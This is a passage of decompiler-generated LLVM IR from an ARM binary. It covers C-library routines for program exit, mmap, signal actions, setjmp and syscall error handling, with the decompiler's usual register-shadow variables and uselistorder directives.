  %v2_16ad8 = add i32 %v2_16ad4.pre, -68676
  store i32 %v2_16ad8, i32* %r2.global-to-local, align 4
  store i32 %v2_16ad8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ae0 = icmp eq i32 %v2_16ad8, 0
  store i1 %v2_16ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ae0, label %dec_label_pc_16af8, label %dec_label_pc_16ae8

dec_label_pc_16ae8:                               ; preds = %dec_label_pc_16ad0
  store i32 92912, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_16ad8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16af4 = load i32, i32* %r0.global-to-local, align 4
  %v2_16af4 = inttoptr i32 %v1_16af4 to i32*
  store i32 0, i32* %v2_16af4, align 4
  %v2_16afc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16ad0, %dec_label_pc_16ae8
  %v2_16afc = phi i32 [ %v2_16ad4.pre, %dec_label_pc_16ad0 ], [ %v2_16afc.pre, %dec_label_pc_16ae8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_16afc, i32* %r1.global-to-local, align 4
  %v2_16b00 = add i32 %v2_16afc, 128
  %v3_16b00 = inttoptr i32 %v2_16b00 to i32*
  %v4_16b00 = load i32, i32* %v3_16b00, align 4
  store i32 %v4_16b00, i32* %r2.global-to-local, align 4
  store i32 %v4_16b00, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16b08 = icmp eq i32 %v4_16b00, 0
  store i1 %v2_16b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b08, label %dec_label_pc_16b20, label %dec_label_pc_16b10

dec_label_pc_16b10:                               ; preds = %dec_label_pc_16af8
  store i32 92952, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16b00)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16b1c = load i32, i32* %r0.global-to-local, align 4
  %v2_16b1c = inttoptr i32 %v1_16b1c to i32*
  store i32 0, i32* %v2_16b1c, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16b20:                               ; preds = %dec_label_pc_16af8, %dec_label_pc_16b10
  %v2_16b20 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_16b20, i32* @r0, align 4
  %v1_16b24 = call i32 @_setjmp(i32 %v2_16b20)
  store i32 %v1_16b24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16b28 = icmp eq i32 %v1_16b24, 0
  store i1 %v2_16b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b28, label %dec_label_pc_16b30, label %dec_label_pc_16b7c

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16b20
  %v0_16b30 = call i32 @__aeabi_read_tp()
  store i32 %v0_16b30, i32* %r0.global-to-local, align 4
  %v1_16b34 = add i32 %v0_16b30, -1168
  store i32 %v1_16b34, i32* %r2.global-to-local, align 4
  %v2_16b3c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16b3c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_16b48 = add i32 %v2_16b3c, 56
  %v3_16b48 = inttoptr i32 %v2_16b48 to i32*
  %v4_16b48 = load i32, i32* %v3_16b48, align 4
  store i32 %v4_16b48, i32* %ip.global-to-local, align 4
  store i32 %v2_16b20, i32* %r3.global-to-local, align 4
  %v2_16b58 = add i32 %v0_16b30, -1040
  %v3_16b58 = inttoptr i32 %v2_16b58 to i32*
  store i32 %v2_16b20, i32* %v3_16b58, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_16b64 = load i32, i32* %ip.global-to-local, align 4
  %v1_16b64 = inttoptr i32 %v0_16b64 to i32*
  %v2_16b64 = load i32, i32* %v1_16b64, align 4
  store i32 %v2_16b64, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_16b74 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16c18

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b20
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_16b80 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16b80, i32* %ip.global-to-local, align 4
  %v2_16b84 = add i32 %v2_16b80, 40
  %v3_16b84 = inttoptr i32 %v2_16b84 to i32*
  %v4_16b84 = load i32, i32* %v3_16b84, align 4
  store i32 %v4_16b84, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16b84)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_16b94 = load i32, i32* %stack_var_-416, align 4
  %v2_16b98 = add i32 %v2_16b94, 120
  %v3_16b98 = inttoptr i32 %v2_16b98 to i32*
  %v4_16b98 = load i32, i32* %v3_16b98, align 4
  store i32 %v4_16b98, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b9c

dec_label_pc_16b9c:                               ; preds = %dec_label_pc_16bd0.dec_label_pc_16b9c_crit_edge, %dec_label_pc_16b7c
  %v0_16b9c = phi i32 [ %v0_16b9c.pre, %dec_label_pc_16bd0.dec_label_pc_16b9c_crit_edge ], [ %v4_16b98, %dec_label_pc_16b7c ]
  %v1_16b9c = inttoptr i32 %v0_16b9c to i32*
  %v2_16b9c = load i32, i32* %v1_16b9c, align 4
  store i32 %v0_16b9c, i32* %r2.global-to-local, align 4
  store i32 %v2_16b9c, i32* %r4.global-to-local, align 4
  %v1_16ba8 = add i32 %v2_16b9c, -1
  store i32 %v1_16ba8, i32* %r1.global-to-local, align 4
  %v2_16bac89 = load i32, i32* %v1_16b9c, align 4
  store i32 %v2_16bac89, i32* %r3.global-to-local, align 4
  %v3_16bb091 = icmp uge i32 %v2_16bac89, %v2_16b9c
  store i1 %v3_16bb091, i1* %cpsr_c.global-to-local, align 1
  %v9_16bb097 = icmp eq i32 %v2_16bac89, %v2_16b9c
  store i1 %v9_16bb097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16bb097, label %dec_label_pc_16bb8, label %dec_label_pc_16bd0

dec_label_pc_16bb8:                               ; preds = %dec_label_pc_16b9c, %dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge
  %v0_16bb898 = phi i32 [ %v1_16bb0.pre, %dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge ], [ %v2_16b9c, %dec_label_pc_16b9c ]
  store i32 %v0_16bb898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16bc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16bc8, label %dec_label_pc_16bcc, label %dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge

dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge:  ; preds = %dec_label_pc_16bb8
  %v0_16bac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16bb0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16bac = inttoptr i32 %v0_16bac.pre to i32*
  %v2_16bac = load i32, i32* %v1_16bac, align 4
  store i32 %v2_16bac, i32* %r3.global-to-local, align 4
  %v3_16bb0 = icmp uge i32 %v2_16bac, %v1_16bb0.pre
  store i1 %v3_16bb0, i1* %cpsr_c.global-to-local, align 1
  %v9_16bb0 = icmp eq i32 %v2_16bac, %v1_16bb0.pre
  store i1 %v9_16bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16bb0, label %dec_label_pc_16bb8, label %dec_label_pc_16bd0

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16bb8
  %v0_16bcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16bcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16bd0

dec_label_pc_16bd0:                               ; preds = %dec_label_pc_16b9c, %dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge, %dec_label_pc_16bcc
  %v0_16bd8 = phi i32 [ %v0_16bcc, %dec_label_pc_16bcc ], [ %v2_16bac89, %dec_label_pc_16b9c ], [ %v2_16bac, %dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge ]
  %v1_16bd0 = phi i32 [ %v0_16bcc, %dec_label_pc_16bcc ], [ %v2_16b9c, %dec_label_pc_16b9c ], [ %v1_16bb0.pre, %dec_label_pc_16bb8.dec_label_pc_16bac_crit_edge ]
  %v3_16bd0 = icmp uge i32 %v0_16bd8, %v1_16bd0
  store i1 %v3_16bd0, i1* %cpsr_c.global-to-local, align 1
  %v9_16bd0 = icmp eq i32 %v0_16bd8, %v1_16bd0
  store i1 %v9_16bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16bd0, label %dec_label_pc_16bd8, label %dec_label_pc_16bd0.dec_label_pc_16b9c_crit_edge

dec_label_pc_16bd0.dec_label_pc_16b9c_crit_edge:  ; preds = %dec_label_pc_16bd0
  %v0_16b9c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16b9c

dec_label_pc_16bd8:                               ; preds = %dec_label_pc_16bd0
  %v2_16bd8 = icmp ne i32 %v1_16bd0, 0
  store i1 %v2_16bd8, i1* %cpsr_c.global-to-local, align 1
  %v7_16bd8 = icmp eq i32 %v1_16bd0, 1
  store i1 %v7_16bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16bd8, label %dec_label_pc_16c18, label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16bd8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16c18

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16bd8, %dec_label_pc_16be0, %dec_label_pc_16b30
  %storemerge2 = phi i32 [ %v0_16b74, %dec_label_pc_16b30 ], [ 0, %dec_label_pc_16be0 ], [ 0, %dec_label_pc_16bd8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_16c1c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_16c1c, i32* %r0.global-to-local, align 4
  %v0_16c20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16c20, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_16c18
  %v2_16c20 = load i32, i32* @r8, align 4
  %v8_16c24 = shl i32 %v2_16c20, %v1_16c1c
  %v9_16c24 = and i32 %v8_16c24, %v1_16c1c
  %v8_16c28 = lshr i32 %v2_16c20, %v9_16c24
  %v9_16c28 = and i32 %v8_16c28, %v9_16c24
  store i32 %v9_16c28, i32* %r0.global-to-local, align 4
  %v4_16c2c = inttoptr i32 %v9_16c28 to i32*
  store i32 %v9_16c28, i32* %v4_16c2c, align 4
  %v5_16c2c = load i32, i32* %r4.global-to-local, align 4
  %v6_16c2c = load i32, i32* %r0.global-to-local, align 4
  %v7_16c2c = sub i32 %v6_16c2c, %v5_16c2c
  %v3_16c30 = mul i32 %v7_16c2c, %v5_16c2c
  %v5_16c38 = mul i32 %v5_16c2c, 4
  %v5_16c3c = udiv i32 %v5_16c2c, 2
  %v6_16c38 = and i32 %v5_16c3c, %v5_16c38
  %v6_16c3c = and i32 %v6_16c38, %v3_16c30
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_16c3c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16c18, %bb85
  %v5_16c40 = phi i32 [ %v1_16c1c, %dec_label_pc_16c18 ], [ %v6_16c3c, %bb85 ]
  ret i32 %v5_16c40

; uselistorder directives
  uselistorder i32 %v5_16c2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16c1c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_16bd0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16bcc, { 1, 0, 2 }
  uselistorder i32 %v1_16bb0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16b9c, { 1, 0 }
  uselistorder i32 %v2_16afc, { 1, 0 }
  uselistorder i32 %v2_16ad4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_16ac8, { 1, 0 }
  uselistorder i32 %v1_16ac4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_16ab8, { 1, 0 }
  uselistorder i32 %v1_16a84, { 1, 0 }
  uselistorder i32 %v1_16a80, { 1, 2, 3, 0 }
  uselistorder i32 %v1_16a74, { 1, 0 }
  uselistorder i32 %v2_16a50, { 1, 0, 2 }
  uselistorder i32 %v4_16a34, { 1, 0, 2 }
  uselistorder i32 %v4_16a24, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1696c, { 1, 2, 0 }
  uselistorder i32 %v2_16938, { 1, 2, 0 }
  uselistorder i32 %v1_16934, { 1, 2, 0 }
  uselistorder i1 %v2_16920, { 1, 0, 2 }
  uselistorder i32 %v5_16924, { 1, 0, 2, 3 }
  uselistorder i32 %v2_168f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_168d8, { 1, 0, 2 }
  uselistorder i32 %v2_168cc, { 1, 0, 2 }
  uselistorder i32 %v3_1689c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 3, 1, 2, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 14, 11, 12, 13, 19, 15, 16, 17, 18, 21, 20, 22, 23, 24, 27, 25, 26, 29, 28, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 1, 15, 17, 16, 0, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 7, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 3, 2, 0, 1, 4 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2036, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16c18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16bd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16bb8, { 1, 0 }
  uselistorder label %dec_label_pc_16b20, { 1, 0 }
  uselistorder label %dec_label_pc_16af8, { 1, 0 }
  uselistorder label %dec_label_pc_16a74, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_169f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169c8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_16938, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_16920, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16c6c = load i32, i32* @r4, align 4
  store i32 %v3_16c6c, i32* %stack_var_-16, align 4
  %v3_16c78 = urem i32 %arg3, 4096
  %v2_16c7c = icmp eq i32 %v3_16c78, 0
  br i1 %v2_16c7c, label %dec_label_pc_16ca0, label %dec_label_pc_16c84

dec_label_pc_16c84:                               ; preds = %entry
  %v0_16c88 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c88, i32* %r0.global-to-local, align 4
  %v3_16c8c = load i16, i16* @global_var_24150.533, align 2
  %v4_16c8c = sext i16 %v3_16c8c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16c98 = add i32 %v4_16c8c, %v0_16c88
  %v4_16c98 = inttoptr i32 %v3_16c98 to i32*
  store i32 22, i32* %v4_16c98, align 4
  %v0_16cd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16cd4

dec_label_pc_16ca0:                               ; preds = %entry
  %v0_16cb0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16cb0, -4095
  br i1 %tmp, label %dec_label_pc_16cd0, label %dec_label_pc_16cb8

dec_label_pc_16cb8:                               ; preds = %dec_label_pc_16ca0
  %v1_16cbc = sub i32 0, %v0_16cb0
  %v3_16cc0 = load i16, i16* @global_var_24150.533, align 2
  %v4_16cc0 = sext i16 %v3_16cc0 to i32
  %v0_16cc4 = call i32 @__aeabi_read_tp()
  %v3_16cc8 = add i32 %v4_16cc0, %v0_16cc4
  %v4_16cc8 = inttoptr i32 %v3_16cc8 to i32*
  store i32 %v1_16cbc, i32* %v4_16cc8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16cd0

dec_label_pc_16cd0:                               ; preds = %dec_label_pc_16ca0, %dec_label_pc_16cb8
  %v0_16cd0 = phi i32 [ %v0_16cb0, %dec_label_pc_16ca0 ], [ -1, %dec_label_pc_16cb8 ]
  store i32 %v0_16cd0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %dec_label_pc_16c84, %dec_label_pc_16cd0
  %v0_16cd4 = phi i32 [ %v0_16cd4.pre, %dec_label_pc_16c84 ], [ %v0_16cd0, %dec_label_pc_16cd0 ]
  store i32 %v0_16cd4, i32* %r0.global-to-local, align 4
  %v2_16cd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16cd8, i32* @r4, align 4
  ret i32 %v0_16cd4

; uselistorder directives
  uselistorder i32 %v0_16cd4, { 1, 0 }
  uselistorder i32 %v0_16cb0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_16cd4, { 1, 0 }
  uselistorder label %dec_label_pc_16cd0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_16ce8 = load i32, i32* @lr, align 4
  store i32 %v0_16ce8, i32* %stack_var_-4, align 4
  %v0_16cf0 = load i32, i32* @r0, align 4
  %v3_16cf4 = load i16, i16* @global_var_24150.533, align 2
  %v4_16cf4 = sext i16 %v3_16cf4 to i32
  store i32 %v4_16cf4, i32* @r2, align 4
  %v0_16cf8 = call i32 @__aeabi_read_tp()
  %v1_16cfc = sub i32 0, %v0_16cf0
  store i32 %v1_16cfc, i32* @r3, align 4
  %v2_16d00 = load i32, i32* @r2, align 4
  %v3_16d00 = add i32 %v2_16d00, %v0_16cf8
  %v4_16d00 = inttoptr i32 %v3_16d00 to i32*
  store i32 %v1_16cfc, i32* %v4_16d00, align 4
  %v2_16d08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16d08, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16d14 = load i32, i32* @r4, align 4
  %v6_16d14 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_16d1c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_16d1c, label %dec_label_pc_16d70, label %dec_label_pc_16d34

dec_label_pc_16d34:                               ; preds = %entry
  %v1_16d34 = add i32 %arg2, 4
  %v2_16d34 = inttoptr i32 %v1_16d34 to i32*
  %v3_16d34 = load i32, i32* %v2_16d34, align 4
  store i32 %v3_16d34, i32* @r3, align 4
  %v1_16d38 = and i32 %v3_16d34, 67108864
  %v2_16d38 = icmp eq i32 %v1_16d38, 0
  br i1 %v2_16d38, label %dec_label_pc_16d40, label %dec_label_pc_16d70

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d34
  store i32 20, i32* @r2, align 4
  %v2_16d44 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16d44, i32* @r0, align 4
  %v0_16d48 = call i32 @memcpy()
  store i32 %v2_16d44, i32* @ip, align 4
  %v0_16d70.pre = load i32, i32* @r5, align 4
  %v0_16d78.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16d70

dec_label_pc_16d70:                               ; preds = %dec_label_pc_16d34, %entry, %dec_label_pc_16d40
  %v0_16d78 = phi i32 [ %arg3, %dec_label_pc_16d34 ], [ %arg3, %entry ], [ %v0_16d78.pre, %dec_label_pc_16d40 ]
  %v0_16d74 = phi i32 [ %arg2, %dec_label_pc_16d34 ], [ 0, %entry ], [ %v2_16d44, %dec_label_pc_16d40 ]
  %v0_16d70 = phi i32 [ %arg1, %dec_label_pc_16d34 ], [ %arg1, %entry ], [ %v0_16d70.pre, %dec_label_pc_16d40 ]
  %v4_16d80 = call i32 @__syscall_rt_sigaction(i32 %v0_16d70, i32 %v0_16d74, i32 %v0_16d78, i32 8)
  store i32 %v3_16d14, i32* @r4, align 4
  store i32 %v6_16d14, i32* @r5, align 4
  ret i32 %v4_16d80

; uselistorder directives
  uselistorder label %dec_label_pc_16d70, { 2, 0, 1 }
}

define i32 @function_16d94(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d94:
  %v0_16d94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16d94, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16d94
  %v2_16d94 = load i32, i32* @r8, align 4
  %v4_16d94 = mul i32 %v2_16d94, 2
  %v5_16d94 = and i32 %v4_16d94, %arg1
  %v2_16d98 = load i32, i32* @ip, align 4
  %v4_16d98 = lshr i32 %v2_16d98, %v5_16d94
  %v5_16d98 = sub i32 32, %v5_16d94
  %v6_16d98 = shl i32 %v2_16d98, %v5_16d98
  %v7_16d98 = or i32 %v6_16d98, %v4_16d98
  %v9_16d98 = and i32 %v7_16d98, %v5_16d94
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16d94, %bb
  %v10_16d98 = phi i32 [ %arg1, %dec_label_pc_16d94 ], [ %v9_16d98, %bb ]
  ret i32 %v10_16d98

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_16da0 = call i32 @__sigsetjmp()
  ret i32 %v0_16da0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16dd0 = load i32, i32* @r7, align 4
  store i32 %v3_16dd0, i32* %stack_var_-8, align 4
  %v0_16ddc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ddc, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16ddc, -4095
  br i1 %tmp, label %dec_label_pc_16e04, label %dec_label_pc_16dec

dec_label_pc_16dec:                               ; preds = %entry
  %v0_16df0 = call i32 @__aeabi_read_tp()
  %v3_16df4 = load i16, i16* @global_var_24150.533, align 2
  %v4_16df4 = sext i16 %v3_16df4 to i32
  store i32 %v4_16df4, i32* @r3, align 4
  %v0_16df8 = load i32, i32* @r2, align 4
  %v1_16df8 = sub i32 0, %v0_16df8
  store i32 %v1_16df8, i32* @r2, align 4
  %v3_16dfc = add i32 %v4_16df4, %v0_16df0
  %v4_16dfc = inttoptr i32 %v3_16dfc to i32*
  store i32 %v1_16df8, i32* %v4_16dfc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16e04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16e04

dec_label_pc_16e04:                               ; preds = %entry, %dec_label_pc_16dec
  %v1_16e08 = phi i32 [ %v0_16ddc, %entry ], [ -1, %dec_label_pc_16dec ]
  %v2_16e04 = phi i32 [ %v3_16dd0, %entry ], [ %v2_16e04.pre, %dec_label_pc_16dec ]
  store i32 %v2_16e04, i32* @r7, align 4
  ret i32 %v1_16e08

; uselistorder directives
  uselistorder i32 %v0_16ddc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16e04, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %dec_label_pc_16e48, %dec_label_pc_16e5c, %entry
  %v0_16e1c = phi i32 [ %arg1, %entry ], [ %v0_16e1c.pre.pre, %dec_label_pc_16e5c ], [ %v0_16e48, %dec_label_pc_16e48 ]
  store i32 %v0_16e1c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16e1c, -4095
  br i1 %tmp, label %dec_label_pc_16e48, label %dec_label_pc_16e38

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e1c
  %v0_16e38 = call i32 @__aeabi_read_tp()
  %v0_16e3c = load i32, i32* %r2.global-to-local, align 4
  %v1_16e3c = sub i32 0, %v0_16e3c
  store i32 %v1_16e3c, i32* %r2.global-to-local, align 4
  %v3_16e40 = load i16, i16* @global_var_24150.533, align 2
  %v4_16e40 = sext i16 %v3_16e40 to i32
  %v3_16e44 = add i32 %v4_16e40, %v0_16e38
  %v4_16e44 = inttoptr i32 %v3_16e44 to i32*
  store i32 %v1_16e3c, i32* %v4_16e44, align 4
  %v0_16e48.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e48

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e1c, %dec_label_pc_16e38
  %v0_16e48 = phi i32 [ %v0_16e1c, %dec_label_pc_16e1c ], [ %v0_16e48.pre, %dec_label_pc_16e38 ]
  store i32 %v0_16e48, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_16e48, -4095
  br i1 %tmp4, label %dec_label_pc_16e1c, label %dec_label_pc_16e5c

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e48
  %v0_16e5c = call i32 @__aeabi_read_tp()
  %v0_16e60 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e60 = sub i32 0, %v0_16e60
  store i32 %v1_16e60, i32* %r2.global-to-local, align 4
  %v3_16e64 = load i16, i16* @global_var_24150.533, align 2
  %v4_16e64 = sext i16 %v3_16e64 to i32
  %v3_16e68 = add i32 %v4_16e64, %v0_16e5c
  %v4_16e68 = inttoptr i32 %v3_16e68 to i32*
  store i32 %v1_16e60, i32* %v4_16e68, align 4
  %v0_16e1c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e1c

; uselistorder directives
  uselistorder i32 %v0_16e48, { 0, 2, 1 }
  uselistorder i32 %v0_16e1c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16e48, { 1, 0 }
  uselistorder label %dec_label_pc_16e1c, { 1, 0, 2 }
}

